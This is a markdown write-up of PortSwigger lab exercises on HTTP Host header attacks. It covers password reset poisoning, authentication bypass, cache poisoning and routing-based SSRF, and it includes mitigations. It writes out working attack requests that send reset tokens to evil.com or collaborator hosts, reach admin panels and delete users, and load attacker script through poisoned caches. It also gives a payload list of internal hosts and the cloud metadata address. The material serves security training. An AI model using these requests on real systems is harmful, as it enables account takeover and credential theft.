# HTTP Host Header Attacks

## ğŸŒ What is the HTTP Host Header?
The **HTTP Host header** is a mandatory request header that specifies the domain name or IP address a client (such as a browser) is attempting to access.

It allows a web server to determine **which application or website** should handle the incoming request.

This header is essential because **multiple websites can be hosted on the same IP address**, and the server must distinguish between them to route requests correctly.

---

## ğŸ¤” Why the Host Header Matters

### 1ï¸âƒ£ Virtual Hosting
In **virtual hosting**, a single server hosts multiple websites or applications. Incoming requests are routed to the appropriate site based on the value of the **Host** header.

**Example:**
      
    Host: example.com

### 2ï¸âƒ£ Intermediary Systems
Modern architectures often rely on intermediary components such as:

- Reverse proxy servers
- Load balancers
- Content Delivery Networks (CDNs)
- Cloud traffic routing services

These systems use the Host header to determine how requests should be forwarded internally.

### This approach enables:

- Efficient use of IPv4 addresses
- Scalability
- Cost-effective cloud hosting

### âš ï¸ Host Header Injection
Host Header Injection is a vulnerability that occurs when an application trusts and processes the Host header without proper validation.

If an attacker can manipulate this header, they may be able to influence how the application:

- Generates URLs
- Performs redirects
- Handles sensitive workflows

### ğŸ¯ Common Attack Scenarios
Applications frequently rely on the Host header for:
- Generating absolute URLs
- Handling redirects
- Password reset links
- Multi-tenant routing logic

By injecting a malicious Host value, attackers can exploit these mechanisms.

### ğŸ’¥ Impact of Successful Exploitation
A successful Host Header Injection attack may lead to:

- ğŸ”¥ Web cache poisoning
- ğŸ”‘ Password reset poisoning
- ğŸ§ª Cross-Site Scripting (XSS)
- ğŸšª Authentication bypass
- ğŸ” Virtual host brute-forcing
- ğŸŒ Server-Side Request Forgery (SSRF)
- ğŸ£ Phishing and credential theft

### ğŸ›¡ï¸ Mitigation & Best Practices
- Validate and sanitize the Host header
- Use a strict allowlist of trusted domains
- Avoid using Host header to construct sensitive URLs
- Use relative URLs whenever possible
- Configure web servers to reject unexpected Host headers
- Implement proper security checks in reverse proxies

# Lab.1  Basic Password Reset Poisoning

## ğŸ”— References
- **PortSwigger Lab**  
  https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning  

- **Host Header Injection Notes**  
  https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md  

---

## ğŸ” Lab Credentials
- **Victim user:** carlos  
- **Attacker user:** wiener  
- **Password:** peter  
- **Malicious Host:** evil.com  

---

## âš ï¸ Vulnerability Overview
Password Reset Poisoning occurs when an application uses an **unvalidated Host header** to generate password reset links.

If an attacker manipulates this header, the reset link sent to the victim can point to an attacker-controlled domain.

### ğŸš¨ Impact
- Capture the reset token  
- Reset the victimâ€™s password  
- Take over the victimâ€™s account  

---

## ğŸ§  Root Cause
- Application trusts the **Host header**  
- Uses it to build absolute URLs in password reset emails  
- No validation or allowlist for allowed hostnames  

---

## ğŸ› ï¸ Exploitation Steps

### Step 1: Login as Attacker
Log in using the attacker account:

    Username: wiener
    Password: peter

### Step 2: Trigger Password Reset for Victim
1. Go to Forgot Password
2. Enter the victim username:

carlos

3. Intercept the request in Burp Suite

### Step 3: Poison the Host Header
Modify the intercepted request:

    POST /forgot-password HTTP/1.1
    Host: evil.com
    Content-Type: application/x-www-form-urlencoded
    username=carlos
â¡ï¸ The application now generates a password reset link using evil.com

### Step 4: Capture the Reset Token
- The victim receives a password reset email
- The reset link points to:

      https://evil.com/reset?token=XYZ
- Attacker-controlled domain logs the request
- Reset token is captured from server logs or request history

###Step 5: Reset Victim Password
- Use the stolen token on the legitimate application:

      /reset?token=XYZ
- Set a new password for carlos

### Step 6: Login as Victim
- Log in using the new credentials and access the victim account

### ğŸ’¥ Impact
- Full account takeover
- Credential compromise
- Potential lateral movement
- Trust abuse via legitimate password reset flow

### ğŸ›¡ï¸ Mitigation
- Do not trust the Host header for URL generation
- Use a hardcoded canonical domain for password reset links
- Validate Host headers against an allowlist
- Configure reverse proxies to enforce valid hostnames

### ğŸ”‘ Key Takeaway
Any time an application uses the Host header in security-sensitive functionality, it becomes a high-value attack surface.

### ğŸ§ª Example Request

      POST /forgot-password HTTP/2
      Host: p5v32mlz3ya3z3wco7jnnwrjlar1fu3j.oastify.com
      Cookie: session=...; _lab=...
      Content-Length: 53
      Cache-Control: max-age=0
      Sec-Ch-Ua: "Chromium";v="129", "Not?A_Brand";v="8"
      Sec-Ch-Ua-Mobile: ?0
      Sec-Ch-Ua-Platform: "Linux"
      Accept-Language: en-GB,en;q=0.9
      Origin: https://0a95002d03c9677385201ef600e600ab.web-security-academy.net
      Content-Type: application/x-www-form-urlencoded
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
      Sec-Fetch-Site: same-origin
      Sec-Fetch-Mode: navigate
      Sec-Fetch-User: ?1
      Sec-Fetch-Dest: document
      Referer: https://0a95002d03c9677385201ef600e600ab.web-security-academy.net/forgot-password
      Accept-Encoding: gzip, deflate, br
      Priority: u=0, i
      
      csrf=...&username=wiener

# Lab: 2 ğŸ” Host Header Authentication Bypass

## ğŸ“š Reference
- **PortSwigger Lab:**  
  https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

---

## âš ï¸ Vulnerability Overview

- Host Header Authentication Bypass occurs when an application makes authentication or authorization decisions based on the **Host** header.
- If the server trusts this header without validation, an attacker can manipulate it to bypass access controls and gain unauthorized access.

---

## ğŸ§© Root Cause

- Application relies on the **Host** header to determine:
  - Whether a request is internal or external
  - Whether the requester is trusted

- No validation or allowlisting of valid hostnames
- Assumption that the **Host** header cannot be attacker-controlled

---

## ğŸš€ Exploitation Steps

### Step 1: Access the Application as a Normal User

- Open the lab URL
- Sensitive endpoints (e.g., `/admin`) are restricted
- Direct access returns **403 Forbidden** or **Unauthorized**

### Example:

      GET /admin HTTP/1.1
      Host: vulnerable-website.com
### Step 2: Intercept the Request in Burp Suite
1. Send the request to Burp Repeater
2. Confirm /admin access is blocked with default Host header

### Step 3: Modify the Host Header
Change the Host header to a trusted/internal value:

      GET /admin HTTP/1.1
      Host: localhost

### Other payloads:

      Host: 127.0.0.1
      Host: internal
      Host: admin
      Host: trusted.com

### Step 4: Observe Authentication Bypass
- Server treats request as trusted
- Admin panel access is granted
- Authentication/authorization checks are bypassed
âœ… Admin interface becomes accessible

### Step 5: Complete the Lab
- Use exposed admin functionality
- Perform required action (e.g., delete user)
- Lab is marked as solved

### ğŸ’¥ Impact
- Authentication bypass
- Unauthorized admin access
- Privileged actions (user deletion, config changes)
- Trust boundary violations
- Full application compromise

### ğŸ›¡ï¸ Mitigation
- Never use Host header for authentication/authorization
- Validate Host headers using strict allowlist
- Enforce canonical hostnames at server/proxy level
- Restrict internal endpoints via network controls
- Implement proper access control independent of headers

 ### ğŸ“Œ Key Takeaway
Any trust decision based on user-controlled headers is a security risk.
The Host header should only be used for routing â€” not authentication.

 ### ğŸ§ª Example Requests
Access Admin

      GET /admin HTTP/2
      Host: localhost
      Cookie: session=9ELFGYxdoG1bBQ3CtmnGnvtvZTxGaxHz;

### Delete User

      GET /admin/delete?username=carlos HTTP/2
      Host: localhost
      Cookie: session=9ELFGYxdoG1bBQ3CtmnGnvtvZTxGaxHz;

# Lab:3  ğŸ§ª Web Cache Poisoning via Ambiguous Requests

## ğŸ“š Reference
- **PortSwigger Lab:**  
  https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

---

## ğŸ¯ Objective

- Exploit a cache poisoning vulnerability by crafting an **ambiguous HTTP request** that causes the cache and backend server to interpret the request differently.

### Goals:
- Poison the cache  
- Inject malicious content  
- Deliver it to other users  

---

## âš ï¸ Vulnerability Overview

This lab demonstrates a classic **request ambiguity issue**:

- The **cache** interprets the request one way  
- The **backend application** interprets it differently  

Because of this mismatch, an attacker can:

- Store a malicious response in the cache  
- Serve that response to legitimate users  

### Common Causes:
- Multiple Host headers  
- Conflicting routing headers  
- Proxy/backend parsing inconsistencies  

---

## ğŸ§© Root Cause

- Cache uses one header to determine cache key  
- Backend uses another header to generate content  
- These differences create a **desynchronization condition**

### Example Problem:
      Host: vulnerable-website.com
      X-Forwarded-Host: attacker.com
If:
- Cache keys on Host
- Backend uses X-Forwarded-Host

â¡ï¸ You get cache poisoning

### ğŸš€ Exploitation Steps
#### Step 1: Identify Cache Behavior
1. Intercept a request in Burp
2. Send to Repeater
3. Observe cache headers:

        X-Cache: miss
        X-Cache: hit
âœ”ï¸ Confirms response is cached

#### Step 2: Identify Host-Based Reflection
Look for:
- Absolute URLs
- Script sources
- Links generated using Host header

#### Example:

      <script src="https://vulnerable-website.com/resources/js/tracking.js"></script>
### Step 3: Create Ambiguous Request
Craft request with conflicting host information:

      GET / HTTP/1.1
      Host: vulnerable-website.com
      X-Forwarded-Host: evil.com
Or multiple Host headers:

      GET / HTTP/1.1
      Host: vulnerable-website.com
      Host: evil.com
### Step 4: Inject Malicious Payload
Modify request so backend generates malicious script:

      X-Forwarded-Host: evil.com
Response may contain:

      <script src="https://evil.com/resources/js/tracking.js"></script>
### Step 5: Poison the Cache
- Send the malicious request

If:
- Cache keys only on Host
- Backend uses X-Forwarded-Host

Then:
- Poisoned response gets cached
- Future users receive malicious script

Check:

    X-Cache: hit

### Step 6: Deliver Exploit
When a victim visits the site:
- They receive cached page
- Browser loads malicious JS from evil.com
- Attack succeeds
âœ… Lab solved

### ğŸ’¥ Impact
Web cache poisoning can lead to:
- Stored XSS
- Credential theft
- Session hijacking
- Malware distribution
- Persistent defacement
- Mass exploitation of cached users

      âš ï¸ Worse than reflected attacks because:
      The attack persists until cache expires.

### ğŸ›¡ï¸ Mitigation
- Normalize and strictly validate Host headers
- Do not trust X-Forwarded-Host from users
- Ensure cache and backend interpret requests identically
- Use strict cache key policy
- Drop duplicate Host headers
- Enforce canonical hostname at proxy level

### ğŸ§  Key Concept
Cache poisoning happens when two systems disagree on how to interpret a request.
That disagreement becomes the attack surface.

### ğŸ§ª Example Request

      GET / HTTP/1.1
      Host: 0a760036048d37ae80f53ae900a40094.h1-web-security-academy.net
      Host: exploit-0ab500a0047a375980da396201f50074.exploit-server.net
      Cookie: session=RW6HXKWUOBBbOYKiHO3zULfPb49U9S;
      Cache-Control: max-age=0
      Sec-Ch-Ua: "Chromium";v="129", "Not-A?Brand";v="8"
      Sec-Ch-Ua-Mobile: ?0
      Sec-Ch-Ua-Platform: "Linux"
      Accept-Language: en-GB,en;q=0.9
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Sec-Fetch-Site: cross-site
      Sec-Fetch-Mode: navigate
      Sec-Fetch-User: ?1
      Sec-Fetch-Dest: document
      Referer: https://portswigger.net/
      Accept-Encoding: gzip, deflate, br
      Connection: keep-alive

# Lab 4 Reading Based SSRF
## ğŸš€ Exploitation Steps

## Step 1: Confirm Normal Access Restrictions

**Try accessing:**

      GET /admin HTTP/1.1
      Host: vulnerable-website.com

You'll receive:

      403 Forbidden

This confirms admin panel is restricted.

## Step 2: Intercept Request in Burp
- Send a request to Burp Repeater

## Step 3: Modify the Host Header
Change the Host header to a likely internal address:

      GET /admin HTTP/1.1
      Host: 127.0.0.1

Or test internal IP ranges:

      Host: 192.168.0.1
      Host: 192.168.0.2
      Host: localhost

## Step 4: Discover Internal Admin Interface
Eventually, one of the internal IPs responds with:

      200 OK
And returns the admin panel.

### This confirms:

The reverse proxy is routing based on the Host header.

## Step 5: Complete the Lab
Once the internal admin interface is accessible:
- Perform required admin action (e.g., delete a user)
- Lab is marked as solved

## ğŸ’¥ Impact
Routing-based SSRF can lead to:
- Access to internal admin panels
- Cloud metadata access (AWS/GCP/Azure)
- Internal service enumeration
- Database exposure
- Remote code execution (in some environments)

Particularly dangerous in:

- Microservice architectures
- Kubernetes clusters
- Cloud-hosted apps
- Internal API gateways

## ğŸŒ Real-World Example
If deployed in AWS:

    Host: 169.254.169.254

Could allow access to:

    http://169.254.169.254/latest/meta-data/

Which may expose:
- IAM credentials
- Instance roles
- Secret tokens

â¡ï¸ This can lead to full cloud compromise.

## ğŸ›¡ï¸ Mitigation
To prevent routing-based SSRF:
- Strictly validate Host header against an allowlist
- Do not use client-supplied Host for routing decisions
- Use internal routing rules at infrastructure level
- Block requests to internal IP ranges
- Implement SSRF protections (IP filtering, DNS resolution checks)

## ğŸ”‘ Key Concept
If a proxy trusts the Host header for routing, the attacker controls the routing destination.
This is SSRF via misconfiguration.

## ğŸ“Œ Example Request

      GET /admin HTTP/2
      Host: 192.168.0.92
      Cookie: session=qlsYmKdliPLq87ccXEevfPkJ33SyrcSg; ...
      Sec-Ch-Ua: "Not A Brand";v="99", "Chromium";v="142"
      Sec-Ch-Ua-Mobile: ?0
      Sec-Ch-Ua-Platform: "Linux"
      Accept-Language: en-GB,en;q=0.9
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
      Sec-Fetch-Site: none
      Sec-Fetch-Mode: navigate
      Sec-Fetch-User: ?1
      Sec-Fetch-Dest: document
      Accept-Encoding: gzip, deflate, br
      Priority: u=0, i
      Content-Length: 0

## POST Request

      POST /admin/delete HTTP/2
      Host: 192.168.0.92
      Cookie: session=qlsYmKdliPLq87ccXEevfPkJ33SyrcSg; ...
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 55
      
      csrf=PlWIPoLOXAFiyLr2mxwrxy5eObrVMxqa&username=carlos

